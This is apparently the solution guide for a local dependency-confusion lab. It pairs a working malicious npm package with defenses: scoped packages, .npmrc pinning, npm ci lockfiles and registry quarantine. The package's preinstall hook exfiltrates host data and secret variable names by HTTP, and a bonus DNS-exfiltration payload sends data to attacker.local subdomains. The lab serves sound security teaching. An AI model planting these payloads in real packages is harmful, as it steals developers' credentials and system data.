# Solution: Supply Chain Attack Lab

## Attack Walkthrough

### Phase 1: Reconnaissance

Inspect the target application to discover the internal package name and version constraint.

```bash
cat vulnerable-app/package.json
```

Key findings:
- The app depends on `acme-auth-utils` with version range `^1.0.0`.
- The package name is unscoped (no `@org/` prefix).
- The `.npmrc` points to the private registry at `http://localhost:4873`.

The `^1.0.0` constraint means npm accepts any version `>=1.0.0` and `<2.0.0` from the configured registry. However, if a higher major version appears on a fallback registry, npm may prefer it depending on resolution order.

### Phase 2: Weaponisation

Craft a malicious version of `acme-auth-utils` with a preinstall hook that exfiltrates system data.

```bash
cd attacker-workspace
mkdir malicious-package && cd malicious-package
```

Create `package.json`:

```json
{
  "name": "acme-auth-utils",
  "version": "99.0.0",
  "description": "Totally legitimate auth utils",
  "main": "index.js",
  "scripts": {
    "preinstall": "node payload.js"
  }
}
```

Create `payload.js`:

```javascript
const http = require("http");
const os = require("os");

const data = JSON.stringify({
  hostname: os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cwd: process.cwd(),
  nodeVersion: process.version,
  envKeys: Object.keys(process.env).filter(
    k => k.includes("KEY") || k.includes("SECRET") || k.includes("TOKEN")
  ),
  timestamp: new Date().toISOString()
});

const options = {
  hostname: "127.0.0.1",
  port: 3000,
  path: "/exfil",
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "Content-Length": Buffer.byteLength(data)
  }
};

const req = http.request(options, () => {});
req.on("error", () => {});
req.write(data);
req.end();
```

Create `index.js` (decoy so the app doesn't crash after install):

```javascript
function authenticate(username, password) {
  return { success: true, user: username, token: "compromised" };
}
module.exports = { authenticate };
```

### Phase 3: Delivery

Publish the weaponised package to the public registry (port 4874).

```bash
npm publish --registry http://localhost:4874
```

Credentials if prompted: `attacker` / `attacker123`

### Phase 4: Execution

Trigger the dependency confusion in the vulnerable app. Open a new terminal and start the monitoring server first:

```bash
node monitoring-server/server.js
```

Then force the vulnerable app to resolve from the public registry by adding it as a fallback:

```bash
cd vulnerable-app
npm install --registry http://localhost:4874
```

The `preinstall` script fires before any code is installed. The payload POSTs system metadata to the monitoring server.

### Phase 5: Verification

Check the monitoring server terminal. You should see:

```
========================================
  DATA EXFILTRATED DURING npm install
========================================
  Hostname:     <your-kali-hostname>
  Username:     <your-username>
  ...
========================================

[FLAG] hostname=<your-kali-hostname>
[FLAG] username=<your-username>
```

You can also query captured data programmatically:

```bash
curl http://127.0.0.1:3000/captured
```

## Defender Track

Three defense strategies that prevent this attack at different layers.

### Defense 1: Scoped Packages

**Why it works:** Scoped packages (`@org/package-name`) create a namespace that cannot be squatted on the public registry by arbitrary users. When you pair a scope with registry pinning, the name resolves exclusively from your private registry.

**Before (vulnerable):**

```json
{
  "dependencies": {
    "acme-auth-utils": "^1.0.0"
  }
}
```

**After (defended):**

```json
{
  "dependencies": {
    "@acme/auth-utils": "^1.0.0"
  }
}
```

The scoped package lives at `defenses/scoped-auth-utils/`. To test:

```bash
cd defenses/defended-app
npm install --registry http://localhost:4873
```

The attack fails because `@acme/auth-utils` on the public registry (port 4874) does not exist. The scope locks resolution to the private registry.

### Defense 2: Registry Pinning via .npmrc

**Why it works:** An `.npmrc` file can bind an entire scope to a specific registry URL. Even if an attacker publishes `@acme/auth-utils` on a public registry, npm will never look there for `@acme` scoped packages.

**Before (vulnerable `.npmrc`):**

```ini
registry=http://localhost:4873
```

**After (defended `.npmrc`):**

```ini
@acme:registry=http://localhost:4873
registry=http://localhost:4874
```

This configuration says: resolve `@acme/*` packages exclusively from port 4873. Everything else can come from port 4874. The attacker cannot override the scope binding.

### Defense 3: Lockfile Integrity with npm ci

**Why it works:** When you commit a `package-lock.json`, it records the exact version, resolved URL, and SHA-512 integrity hash of every dependency. The `npm ci` command refuses to install anything that doesn't match the lockfile exactly.

**How to use:**

1. Install once with the correct registry to generate the lockfile:

```bash
npm install --registry http://localhost:4873
```

2. Commit `package-lock.json` to version control.

3. On all subsequent installs (CI/CD, other developers), use:

```bash
npm ci
```

If an attacker publishes v99.0.0, `npm ci` rejects it because the lockfile pins v1.0.0 with the hash from your private registry. The install fails with an integrity mismatch error.

### Summary Table

| Defense | Layer | Prevents |
|---------|-------|----------|
| Scoped packages | Naming | Name squatting on public registries |
| Registry pinning | Resolution | Fallback to untrusted registries |
| Lockfile integrity | Verification | Installing tampered or unexpected versions |

## Common Pitfalls & Troubleshooting

### 1. The "No Matching Version Found" (ETARGET) Error
* **The Issue:** When running `npm install` in the vulnerable app, npm returns a `notarget` error.
* **Why it happens:** The vulnerable application's `package.json` specifies `"acme-auth-utils": "^1.0.0"`. The caret (`^`) restricts the version range strictly to `>=1.0.0 <2.0.0`. If you publish your malicious package as version `99.0.0`, npm rejects it because it falls outside the allowed range.
* **The Fix:** Publish your malicious package with a version that satisfies the caret constraint but is higher than the legitimate one, such as `1.99.0`.

### 2. Silent Failures during Attack Trigger (Missing Payload)
* **The Issue:** The installation completes, but no exfiltrated data appears on the monitoring server, and no error is visible (or you see a preinstall execution failure).
* **Why it happens:** When running `npm publish`, npm only bundles the files present in your directory at the moment of publishing. If you publish before creating `payload.js` (or if it is ignored), the package tarball will only contain `package.json` and `index.js`. The `preinstall` script will fail to find the payload file.
* **The Fix:** Run `npm pack` or check the `npm notice` output during publishing to confirm that `payload.js` is explicitly listed under the tarball contents.

### 3. E401 Unauthorized during Publish
* **The Issue:** Running `npm publish` returns an `E401 Unable to authenticate` error.
* **Why it happens:** Running `./teardown-lab.sh` purges the Verdaccio database storage and user configurations. This invalidates any active session tokens on your local machine for that registry.
* **The Fix:** Re-authenticate using the legacy login command:
  ```bash
  npm login --registry http://localhost:4874 --auth-type=legacy
  ```
### 4. Scoped Package "MODULE_NOT_FOUND" in Defended App
* **The Issue:** Running `node index.js` inside `defenses/defended-app/` fails with `Error: Cannot find module '@acme/auth-utils'`.
* **Why it happens:** This occurs when the scoped package was never successfully published to the private registry (port 4873). If the database was recently wiped by a teardown, your active shell session lacks authentication. The publish command `npm publish 2>/dev/null` fails silently without uploading anything. Consequently, when `npm install` runs in the defended application, it has nothing to download, resulting in an empty `node_modules` folder.
* **The Fix:** Move into the package directory, log in to your private registry manually, and verify the upload succeeds with error streams visible:
  ```bash
  cd defenses/scoped-auth-utils
  npm login --registry http://localhost:4873 --auth-type=legacy
  npm publish --registry http://localhost:4873
  ```
  After successful publish, return to your application, re-run `npm install`, and start the app.

## Bonus Mission: Advanced Attacks & Registry-Level Defenses

### 1. DNS Exfiltration (Bypassing HTTP Monitoring)

When network security teams monitor system traffic, they heavily inspect outbound HTTP connections on ports 80, 443, and custom ports like 3000. However, DNS queries on port 53 are fundamental to network operations and are almost never blocked or closely scrutinized.

#### How It Works:
- **Encoding:** The payload (`attacker-workspace/payload-dns.js`) gathers system metadata (hostname, username, platform) and compacts it into a JSON string. This string is then serialized as a URL-safe Base64 string (`base64url`).
- **Chunking:** DNS labels have a strict length limit of 63 characters. To prevent truncation and ensure compatibility, the script chunks the Base64 payload into 50-character segments.
- **Exfiltration:** It appends each chunk as a unique subdomain of an attacker-controlled namespace (e.g., `0-dGVzdA.exfil.attacker.local`) and triggers a DNS TXT lookup using Node's built-in `dns.resolveTxt()` module.
- **Capture:** Even if outbound HTTP is entirely blocked, these DNS queries navigate through intermediate DNS resolvers, allowing an attacker-controlled nameserver (or local packet capture logs) to reconstruct the original system metadata from the query subdomains.

---

#### The Case-Insensitivity Hurdle (Deep Protocol Analysis)

During live traffic sniffing (e.g., using `tcpdump -i any port 53 -n -A`), you will notice a fascinating protocol behavior:
- All outbound DNS subdomains captured on the wire appear in **completely lowercase characters** (e.g., `0-eyjoijoia...` instead of `0-eyJoIjoia...`).
- According to DNS standards, domain routing is strictly **case-insensitive**. Operating system network stacks and recursive resolvers automatically downcase all queries before transmitting them.

##### Why Base64 Fails on the Wire:
Because standard Base64 is case-sensitive (where `A` and `a` represent completely different binary values), this automatic downcasing corrupts the payload. Attempting to copy a sniffed subdomain query and decode it via `base64 -d` will fail with a `base64: invalid input` error or output binary garbage.

##### How Real-World APTs Solve This:
To make DNS exfiltration robust and immune to network-level downcasing, real-world malware and covert communication frameworks avoid Base64. Instead, they implement case-insensitive encoding schemes:
1. **Hexadecimal (Base16):** Uses only digits `0-9` and letters `a-f`.
2. **Base32:** Uses only the characters `A-Z` and numbers `2-7`.

##### Upgraded Case-Insensitive Payload Code:
You can adapt `payload-dns.js` to use Hexadecimal encoding to ensure perfect, lossless transmission:

```javascript
// Encode the gathered metadata as a case-insensitive Hex string
const encoded = Buffer.from(JSON.stringify(systemData)).toString("hex");

// Split into safe chunks and query
const chunks = encoded.match(/.{1,50}/g) || [];
chunks.forEach((chunk, i) => {
  const subdomain = `${i}-${chunk}.exfil.attacker.local`;
  dns.resolveTxt(subdomain, () => {});
});
```

To decode a Hex query sniffed on the wire, use the following command:
```bash
echo "7b2268223a226b616c69222c2275223a226b616c69227d" | xxd -r -p
```

### 2. Registry-Level Quarantine (Defense-in-Depth)

While scoped packages and registry pinning protect individual applications on developer workstations, a registry-level defense protects the entire organization. It acts as an upstream gatekeeper, filtering third-party packages before they can ever be cached or served to build systems.

#### How It Works:
- **The Filter Plugin:** In `verdaccio-configs/private-config-filtered.yaml`, we enable the native `@verdaccio/package-filter` plugin.
- **The minAgeDays: 7 Directives:** When a developer or build server requests an unscoped package, Verdaccio queries the public uplink registry. If an attacker has newly published a high-version malicious package, the filter intercepts the package metadata and checks the publishing timestamp.
- **The Quarantine Effect:** If the package version was published less than 7 days ago, the filter quarantines and hides it from resolving, returning only older, verified versions. This introduces a 7-day window for security researchers or registry automated scanners to flag and take down the public name-squatting packages before they can reach the target environment.

#### Verification (Proof of Concept)

To verify that the quarantine defense is actively dropping freshly published packages, query the package version from both the filtered private registry and the unfiltered public registry.

##### 1. Query the Filtered Private Registry (Port 4873):
```bash
npm view acme-auth-utils versions --registry http://localhost:4873
```
- **Expected Output:** (Blank / Empty response)
- **Why:** The `@verdaccio/package-filter` plugin successfully intercepted the metadata stream from the uplink, detected that the public version `1.99.0` was published less than 7 days ago, and stripped it from the manifest to quarantine it.

##### 2. Query the Public Registry (Port 4874):
```bash
npm view acme-auth-utils versions --registry http://localhost:4874
```
- **Expected Output:** `1.99.0`
- **Why:** The package exists and is fully visible on the public registry space.

This comparison confirms that the corporate development environment is completely insulated from immediate dependency confusion hijacking attempts, even if an attacker successfully squatted the package name publicly.
